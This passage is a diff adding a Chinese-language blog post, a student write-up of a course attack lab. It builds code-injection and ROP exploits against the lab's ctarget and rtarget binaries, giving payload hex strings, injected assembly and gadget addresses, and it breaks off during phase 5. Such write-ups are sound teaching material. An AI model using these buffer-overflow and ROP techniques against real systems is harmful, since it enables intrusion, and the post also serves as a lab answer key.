@@ -1,0 +1,755 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="课程实验4 attack lab">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>lab4_attack lab - Zino&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"zino00.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"f45dcd001d67e8f9d84f91248ea31abf","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Zino's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="lab4_attack lab">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-04 16:21" pubdate>
+        2021年7月4日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      34
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">lab4_attack lab</h1>
+            
+            <div class="markdown-body">
+              <h1 id="attack-lab"><a class="markdownIt-Anchor" href="#attack-lab"></a> Attack lab</h1>
+<h2 id="实验概括"><a class="markdownIt-Anchor" href="#实验概括"></a> 实验概括</h2>
+<p>要求你进行五次攻击。攻击方式是code injection代码注入和Reeturn-oriented programming(ROP)</p>
+<p>文件列表：</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ctarget</td>
+<td>用来做Code injection攻击的程序，phase1-3</td>
+</tr>
+<tr>
+<td>rtarget</td>
+<td>用来做ROP攻击的程序,phase 4-5</td>
+</tr>
+<tr>
+<td>cookie.txt</td>
+<td>作为攻击的标识符</td>
+</tr>
+<tr>
+<td>hex2raw</td>
+<td>用来生成工具字符串</td>
+</tr>
+<tr>
+<td>farm.c</td>
+<td>用于生成面向返回的编程攻击</td>
+</tr>
+</tbody>
+</table>
+<h2 id="预备知识缓冲区溢出"><a class="markdownIt-Anchor" href="#预备知识缓冲区溢出"></a> 预备知识——缓冲区溢出</h2>
+<p>缓冲区溢出的基本原理并不复杂。缓冲区就是操作系统为函数执行专门划分出的一段内存，包括栈(自动变量)、堆(动态内存)和静态数据区(全局或静态)。其中缓冲区溢出发生在栈里，栈存放了函数的参数、返回地址、EBP（EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码）和局部变量。</p>
+<p><strong>当函数中对局部变量的赋值超过了为其分配的存储空间，超出的部分就会覆盖栈里其他部分的数据，也就是发生了缓冲区溢出</strong>。</p>
+<p><img src="/9b9a13df/14ce36d3d539b6000b87d3d293d6f22cc75cb793-1625283594106.jpeg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/9b9a13df/9213b07eca806538756b3e9fee5b6642af3482c2.jpeg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="预备知识rop攻击"><a class="markdownIt-Anchor" href="#预备知识rop攻击"></a> 预备知识——ROP攻击</h2>
+<h3 id="rop攻击"><a class="markdownIt-Anchor" href="#rop攻击"></a> ROP攻击</h3>
+<p>缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。</p>
+<p>（1）<strong>栈随机化</strong></p>
+<p><code>栈随机化</code>的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。</p>
+<p>（2）<strong>栈破坏检测</strong></p>
+<p>最近的GCC版本在产生的代码加入了一种<code>栈保护者</code>机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。</p>
+<p>（3）<strong>限制可执行代码区域</strong></p>
+<p>最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。</p>
+<p>在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以<code>ret</code>结尾，这一段指令序列，我们称之为<code>gadget</code>。</p>
+<p>每一段<code>gadget</code>包含一系列指令字节，而且以<code>ret</code>结尾，跳转到下一个<code>gadget</code>，就这样连续的执行一系列的指令代码，对程序造成攻击。</p>
+<p><strong>示例</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setval_210</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  *p = <span class="hljs-number">3347663060U</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000400f15 &lt;setval_210&gt;:<br>  400f15: c7 07 d4 48 89 c7 movl <span class="hljs-variable">$0xc78948d4</span>,(%rdi)<br>  400f1b: c3 retq<br></code></pre></td></tr></table></figure>
+<p>其中，字节序列<code>48 89 c7</code>是对指令<code>movq %rax, %rdi</code>的编码，就这样我们可以利用已经存在的程序，从中提取出特定的指令,执行特定的功能，地址为<code>0x400f18</code>，其功能是将<code>%rax</code>的内容移到<code>%rdi</code>。</p>
+<p>指令的编码如下所示：</p>
+<p><img src="/9b9a13df/1433829-d6312f1ce53cf044.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>movq指令编码</p>
+<p><img src="/9b9a13df/1433829-2a663eb32fae331a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>popq指令编码</p>
+<p><img src="/9b9a13df/1433829-c713c395456655fa.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>movl指令编码</p>
+<p><img src="https://gitee.com/zino00/img_bed/raw/master/img/1433829-67690582e19e902b.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="实验开始"><a class="markdownIt-Anchor" href="#实验开始"></a> 实验开始</h2>
+<h3 id="1-phase1"><a class="markdownIt-Anchor" href="#1-phase1"></a> 1) phase1</h3>
+<ul>
+<li>
+<p><strong>任务目标</strong></p>
+<p>让getbuf()函数返回touch1()</p>
+</li>
+<li>
+<p><strong>实验步骤</strong></p>
+<p>首先对ctarget进行gdb调试</p>
+<p>然后对getbuf 进行反汇编</p>
+<p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205208407.png" srcset="/img/loading.gif" lazyload alt="image-20210330205208407"></p>
+<p>对touch1进行反汇编</p>
+<p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205255616.png" srcset="/img/loading.gif" lazyload alt="image-20210330205255616"></p>
+<p>可知getbuf()开辟了0x28，即40字节的空间，返回地址存在%rsp+0x28的地址，</p>
+<p>而touch1的初始地址为0x004017c0</p>
+<p>所以当我们存入缓冲区的数据，即touch1的初始地址可以覆盖这个返回地址时，我们就可以成功返回touch1了</p>
+<p>攻击序列设置：</p>
+<p>00 00 00 00 00 00 00 00 00 00</p>
+<p>00 00 00 00 00 00 00 00 00 00</p>
+<p>00 00 00 00 00 00 00 00 00 00</p>
+<p>00 00 00 00 00 00 00 00 00 00</p>
+<p>c0 17 40 00 00 00 00 00</p>
+<p>以小端方式存储于1.txt中</p>
+<p>用hex2raw转化为字符串，执行命令</p>
+<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt &gt;</span>2.txt<br></code></pre></td></tr></table></figure>
+<p>再执行</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330210214612.png" srcset="/img/loading.gif" lazyload alt="image-20210330210214612"></p>
+</li>
+</ul>
+<h3 id="2-phase2"><a class="markdownIt-Anchor" href="#2-phase2"></a> 2) phase2</h3>
+<ul>
+<li>
+<p><strong>任务要求</strong></p>
+<p>要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie</p>
+</li>
+<li>
+<p><strong>实验步骤</strong></p>
+<p>反汇编查看touch2地址</p>
+<p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330211924002.png" srcset="/img/loading.gif" lazyload alt="image-20210330211924002"></p>
+<p>要求我们把参数设置为cookie，即把%rdi的值改为cookie，再执行touch2. 即ret touch2的地址。</p>
+<p>转化为汇编代码保存在1.s中，</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">59</span>b<span class="hljs-number">997</span>fa,%rdi<br><span class="hljs-attribute">pushq</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">4017</span>ec<br><span class="hljs-attribute">ret</span><br></code></pre></td></tr></table></figure>
+<p>用<code>gcc -c 1.s -o 1.o</code>指令转化为机器代码</p>
+<p>并将其反汇编，保存在2.txt中，2.txt如图</p>
+<p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331210915437.png" srcset="/img/loading.gif" lazyload alt="image-20210331210915437"></p>
+<p>利用gdb调试，进入getbuf函数里，查看%rsp的地址</p>
+<p><img src="/9b9a13df/image-20210412193826843.png" srcset="/img/loading.gif" lazyload alt="image-20210412193826843"></p>
+<p>如上所示，我们获取到了%rsp的地址，结合上文所讲，可以构造出如下字符串，在栈的开始位置为注入代码的指令序列，然后填充满至40个字节，在接下来的8个字节，也就是原来的返回地址，填充成注入代码的起始地址，也就是%rsp的地址，可以得到如下字符串，保存在1.txt中</p>
+<p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211305114.png" srcset="/img/loading.gif" lazyload alt="image-20210331211305114"></p>
+<p><img src="/9b9a13df/1433829-fa485a0533812b76.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>利用raw2hex转化为字符串</p>
+<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt&gt;</span> 2.txt<br></code></pre></td></tr></table></figure>
+<p>再执行</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211454524.png" srcset="/img/loading.gif" lazyload alt="image-20210331211454524"></p>
+</li>
+</ul>
+<h3 id="3-phase3"><a class="markdownIt-Anchor" href="#3-phase3"></a> 3) phase3</h3>
+<ul>
+<li>
+<p><strong>任务要求</strong></p>
+<p>第三阶段，也是需要在输入的字符串中注入一段代码，但是不同于第二阶段的是，在这一阶段中我们需要将cookie转化为字符串作为参数。</p>
+<p><img src="/9b9a13df/image-20210412202523955.png" srcset="/img/loading.gif" lazyload alt="image-20210412202523955"></p>
+</li>
+<li>
+<p><strong>实验步骤</strong></p>
+<p>我们首先构造注入代码，touch3的地址为0x4018fa,根据上一关我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28（保存代码执行地址的位置）,然后字符串地址应为%rsp+0x30(48)，即0x5561dca0.</p>
+<p>所以注入代码为,保存在cs.s中</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">5561</span>dc<span class="hljs-number">98</span>,%rdi                                                                                     <br><span class="hljs-attribute">pushq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">004018</span>fa<br><span class="hljs-attribute">retq</span><br></code></pre></td></tr></table></figure>
+<p>汇编和反汇编</p>
+<p><img src="/9b9a13df/image-20210412203205921.png" srcset="/img/loading.gif" lazyload alt="image-20210412203205921"></p>
+<p><img src="/9b9a13df/image-20210412203220388.png" srcset="/img/loading.gif" lazyload alt="image-20210412203220388"></p>
+<p>利用man ascii将cookie转化为16进制</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>所以，注入序列为：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">48 </span>c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <br><span class="hljs-symbol">40 </span><span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">78 </span>dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span><br><span class="hljs-symbol">62 </span><span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>将其保存在touch_3.txt中，执行指令，可得：</p>
+<p><img src="/9b9a13df/image-20210412203956357.png" srcset="/img/loading.gif" lazyload alt="image-20210412203956357"></p>
+</li>
+</ul>
+<h3 id="4-phase4"><a class="markdownIt-Anchor" href="#4-phase4"></a> 4) phase4</h3>
+<ul>
+<li>
+<p><strong>任务要求</strong></p>
+<p>在这一阶段中，我们其实是重复代码注入攻击中第二阶段的任务，劫持程序流，返回到<code>touch2</code>函数。只不过这个我们要做的是ROP攻击，这一阶段我们无法再像上一阶段中将指令序列放入到栈中，所以我们需要到现有的程序中，找到我们需要的指令序列。</p>
+</li>
+<li>
+<p><strong>实验步骤</strong></p>
+<p>我们需要的代码序列：</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos">popq <span class="hljs-built_in">%rax</span><br>movq <span class="hljs-built_in">%rax</span>, <span class="hljs-built_in">%rdi</span><br></code></pre></td></tr></table></figure>
+<p>其指令编码为：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">58</span><br><span class="hljs-symbol">48 </span><span class="hljs-number">89</span> c7<br></code></pre></td></tr></table></figure>
+<p>在rtarget的反汇编代码中查找</p>
+<p><img src="/9b9a13df/image-20210412211719953.png" srcset="/img/loading.gif" lazyload alt="image-20210412211719953"></p>
+<p>所以popq %rax指令起始地址为：0x4019ab</p>
+<p><img src="/9b9a13df/image-20210412211839599.png" srcset="/img/loading.gif" lazyload alt="image-20210412211839599"></p>
+<p>所以movq %rax, %rdi指令起始地址为：0x4019a2</p>
+<p>所以得到字符串，保存在touch_4中：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b<span class="hljs-number">9</span> <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>执行指令：</p>
+<p><img src="/9b9a13df/image-20210412212407837.png" srcset="/img/loading.gif" lazyload alt="image-20210412212407837"></p>
+</li>
+</ul>
+<h3 id="5-phase5"><a class="markdownIt-Anchor" href="#5-phase5"></a> 5) phase5</h3>
+<ul>
+<li>
+<p><strong>任务要求</strong></p>
+<p>在这一阶段中，我们需要做的就是把字符串的起始地址，传送到<code>%rdi</code>,然后调用<code>touch3</code>函数。</p>
+<p>因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。从<code>farm</code>中我们可以获取到这样一个<code>gadget</code>，<code>lea (%rdi,%rsi,1),%rax</code>，这样就可以把字符串的首地址传送到<code>%rax</code>。</p>
+</li>
+<li>
+<p><strong>实验步骤</strong></p>
+<p>解题思路：</p>
+<p>（1）首先获取到<code>%rsp</code>的地址，并且传送到<code>%rdi</code><br>
+（2）其二获取到字符串的偏移量值，并且传送到<code>%rsi</code><br>
+（3）<code>lea (%rdi,%rsi,1),%rax</code>, 将字符串的首地址传送到<code>%rax</code>, 再传送到<code>%rdi</code><br>
+（4）调用<code>touch3</code>函数</p>
+</li>
+</ul>
+<p>(1) 第一步，获取到<code>%rsp</code>的地址</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">0000000000401a03 <span class="hljs-tag">&lt;<span class="hljs-name">addval_190</span>&gt;</span>:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3  <br><br></code></pre></td></tr></table></figure>
+<p>movq %rsp, %rax<code>的指令字节为：</code>48 89 e0<code>, 所以这一步的</code>gadget<code>地址为：</code>0x401a06</p>
+<p>(2) 第二步，将<code>%rax</code>的内容传送到<code>%rdi</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></td></tr></table></figure>
+<p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p>
+<p>(3) 第三步，将偏移量的内容弹出到<code>%rax</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00000000004019ca &lt;getval_280&gt;:<br>  4019ca: b8 29 58 90 c3        mov    <span class="hljs-variable">$0xc3905829</span>,%eax<br>  4019cf: c3   <br><br></code></pre></td></tr></table></figure>
+<p>popq %rax<code>的指令字节为：</code>58<code>， 其中</code>90<code>为</code>nop<code>指令, 所以这一步的</code>gadget<code>地址为：</code>0x4019cc</p>
+<p>(4) 第四步，将<code>%eax</code>的内容传送到<code>%edx</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00000000004019db &lt;getval_481&gt;:<br>  4019db: b8 5c 89 c2 90        mov    <span class="hljs-variable">$0x90c2895c</span>,%eax<br>  4019e0: c3    <br><br></code></pre></td></tr></table></figure>
+<p>movl %eax, %edx<code>的指令字节为:</code>89 c2<code>, 所以这一步的</code>gadget<code>地址为：</code>0x4019dd</p>
+<p>(5) 第五步，将<code>%edx</code>的内容传送到<code>%ecx</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000401a6e &lt;setval_167&gt;:<br>  401a6e: c7 07 89 d1 91 c3     movl   <span class="hljs-variable">$0xc391d189</span>,(%rdi)<br>  401a74: c3  <br><br></code></pre></td></tr></table></figure>
+<p>movl %edx, %ecx<code>的指令字节为：</code>89 d1<code>，所以这一步的</code>gadget<code>地址为：</code>0x401a70</p>
+<p>(6) 第六步，将<code>%ecx</code>的内容传送到<code>%esi</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">0000000000401a11 <span class="hljs-tag">&lt;<span class="hljs-name">addval_436</span>&gt;</span>:<br>  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax<br>  401a17: c3                    retq <br><br></code></pre></td></tr></table></figure>
+<p>movl %ecx, %esi<code>的指令字节为：</code>89 ce<code>, 所以这一步</code>gadget<code>地址为：</code>0x401a13</p>
+<p>(7) 第七步，将栈顶 + 偏移量得到字符串的首地址传送到<code>%rax</code></p>
